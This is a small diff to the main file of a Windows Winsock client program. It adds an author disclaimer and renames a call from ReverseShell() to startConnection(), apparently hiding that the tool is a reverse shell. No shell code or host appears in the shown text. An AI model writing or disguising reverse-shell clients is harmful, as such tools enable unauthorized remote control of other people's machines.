@@ -1,4 +1,8 @@
-#pragma once
+/*
+Author: millybilligan
+GitHub: https://github.com/millybilligan
+The author is not responsible for the use of this program. Use for illegal purposes is prohibited!
+*/
 #define _CRT_SECURE_NO_WARNINGS
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <Winsock2.h>
@@ -19,6 +23,6 @@
 
 int main() {
 	Client a;
-	a.ReverseShell();
+	a.startConnection();
 	return 0;
 }
